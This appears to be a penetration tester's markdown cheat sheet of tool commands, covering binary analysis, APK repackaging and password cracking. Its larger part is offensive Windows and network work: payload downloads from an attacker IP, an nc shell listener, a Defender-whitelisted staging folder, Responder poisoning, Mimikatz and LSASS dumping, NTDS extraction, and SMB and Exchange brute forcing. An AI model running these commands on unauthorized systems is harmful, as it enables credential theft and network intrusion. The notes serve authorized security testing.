# Exploit dev
Show binary protections:  
```
$ rabin2 -I <binary>
$ checksec -f <binary>
```

List imported functions:  
```
$ rabin2 -i <binary>
```

List functions written by the programmer (approx.):  
```
$ rabin2 -qs <binary> | grep -ve imp -e ' 0 '
```

List symbols: (a = inlcude debug symbols, n = sort by address [numeric])
```
$ nm -a -n <binary>
```

Strings:  
```
$ rabin2 -z <binary>
```

ROP gadgets:
```
$ python3 Ropper.py -f <file(s)>
      --all
      --search 'inc eax'
      --jmp eax
      --badbytes 000a0d
      --console
      --help
```

## Radare2
| Function                  | Command |
| ---                       | --- |
| Open file                 | ```$ r2 <binary>``` |
| Help                      | ```> ?``` |
| Quit                      | ```> q``` |
| Analyse all               | ```> aa``` |
| List functions            | ```> afl``` |
| Disassemble function      | ```> pdf [@ <function name>]``` |

# Python

## Host webserver in current directory
```python3 -m http.server```  
```python2 -m SimpleHTTPServer```

# PDF files
## Tools
https://blog.didierstevens.com/programs/pdf-tools/

## Crack
Download Bleeding John (https://github.com/magnumripper/JohnTheRipper). Use pdf2john.pl.
```Kali
$ perl pdf2john.pl file.pdf > pdf-hash.txt
$ john --wordlist=/w/rockyou.txt pdf-hash.txt
```

# PIL
## 
```python
from PIL import Image
img = Image.open("image.png")
pixels = list(img.getdata())
```

# ZIP files
## Crack
```Kali
$ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
```

# Windows

## World-write/readable Directory, Windows Defender whitelist, and on UAC bypass list
```
C:\Windows\System32\spool\drivers\color\
```

## Powershell

### Is Poserwhell running in Constrained language mode?
```
$ExecutionContext.SessionState.LanguageMode
```

### Download file over HTTP (works in CLM)
```
PS C:\> Invoke-WebRequest -uri http://<attacker ip>/<file> -o <output filename>
PS C:\> iwr -uri http://<attacker ip>/<file> -o <output filename>
```

# PostSploit

## Arrow-support for nc
```
rlwrap nc -nvlp 4444
```

# Tmux
| Action            | Command               |
|---                |---                    |
| New tmux          | ```tmux new -s ...``` |
| List tmuxs        | ```tmux ls```         |
| Attach to tmux    | ```tmux a -t ...```   |
| Detatch from tmux | ```Ctrl+b d```        |
| Scroll mode       | ```Ctrl+b [```        |
| Exit scroll mode  | ```q```               |

# Android
## Decompile APK
```
apktool d <package.apk>
```

## Recompile APK
```
apktool b <package/>
cp <package>/dist/<package.apk> .
keytool -genkey -v -keystore debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 20000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore <package.apk> android
OR
jarsigner -verbose -sigalg SHA256withRSA -keystore debug.keystore <package.apk> android
jarsigner -verify -verbose -certs <package.apk>
zipalign -v 4 <package.apk> <package-align.apk>
```
## ADB
| Action                 | Command                              |
|---                     |---                                   |
| List connected devices | ```adb devices [-l]              ``` |
| Install apk via adb    | ```adb install <package.apk>     ``` |
| Ininstall apk via adb  | ```adb uninstall <package-name>  ``` |
| Spawn Android shell    | ```adb shell                     ``` |
| Display log            | ```adb logcat [-f log.txt]       ``` |
| Download file          | ```adb pull <remote-file> <local>``` |
| Upload file            | ```adb push <local-file> <remote>``` |

[https://devhints.io/adb](https://devhints.io/adb)

## Objection
| Action          | Command                                          |
|---              |---                                               |
| Instrument app  | ```objection patchapk --source <package.apk> ``` |
| Start objection | ```objection explore```                          |

Note: Run ```mkdir -p /root/.local/share/apktool/framework``` before running ```objection patchapk```.

# SSRF

## TCPdump
Listen on port 443:  
```
tcpdump -i eth0 -nn -s0 -v port 443
```

https://hackertarget.com/tcpdump-examples/


# Sqlmap
```
sqlmap -r <file.req> --risk=3 -- level=3
```

# Responder
Safe:
```
./Responder.py -I eth0 -wrf
```
Dangerous:
```
./Responder.py -I eth0 -wrfd
```

# Hashcat
Responder:
```
~/Tools/fanspeedSetNew.sh -s 100; ~/Tools/hashcat/hashcat64.bin -m 5600 -O -w 3 --session <session-name> responder.txt -o responder-cracked.txt /media/data/Wordlists/linkedin.txt -r ~/Tools/hashcat/rules/OneRuleToRuleThemAll.rule 
```

NTLM (NTDS.DIT):
```
~/Tools/fanspeedSetNew.sh -s 100; ~/Tools/hashcat/hashcat64.bin -m 1000 -O -w 3 --session <session-name> ntlm.txt -o ntlm-cracked.txt /media/data/Wordlists/linkedin.txt -r ~/Tools/hashcat/rules/OneRuleToRuleThemAll.rule 
```

LM:
```
~/Tools/fanspeedSetNew.sh -s 100; ~/Tools/hashcat/hashcat64.bin -m 3000 -O -w 3 --session <session-name> lm.txt -o lm-cracked.txt -a 3 '?a?a?a?a?a?a?a' --increment
```

Print passwords in pot file:
```
~/Tools/fanspeedSetNew.sh -s 100; ~/Tools/hashcat/hashcat64.bin hashes.txt --show
```

Restore a session:
```
~/Tools/fanspeedSetNew.sh -s 100; ~/Tools/hashcat/hashcat64.bin --session <session-name> --restore
```
# PowerShell
runas:
```
runas /netonly /user:domain\username powershell
```

# John
Apply rules to passwords:
```
john --stdout --wordlist=simpleps.txt --rules > complex-pws.txt
```

# Hydra
SMB:
```
hydra -L <usernames.txt> -P <passwords.txt> -o hydra-out.txt -u smb://<IP>
```

# Ruler

```
.\ruler-win64.exe --domain <domain> brute --users .\usernames.txt --passwords .\passwords.txt
```

# Masscan

```
masscan -p1-65535,U:1-65535 --open --banners -oB massscan-all-tcp-udp <IP>
masscan --readscan massscan-all-tcp-udp
```

# Mimikatz

Dumping hashes locally:
```
privilege::debug
log
sekurlsa::logonpasswords
```

Dumping hashes remotely:
```
TARGET > procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

LOCAL MIMIKATZ >
log 
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

# Crackmapexec

Installation:
```
apt-get install crackmapexec
```

Find shares:
```
crackmapexec smb -d <domain> -u <user> -p <password> 10.10.10.0/24 --shares
```

Dump NTDS:
```
crackmapexec smb -d <domain> -u <user> -p <password> <Domain Controller IP> --ntds drsuapi
```

# Azucar ()
```
.\Azucar.ps1 -ResolveTenantUserName <user@domain.com>
.\Azucar.ps1 -TenantID <tenantID> -ForceAuth
```
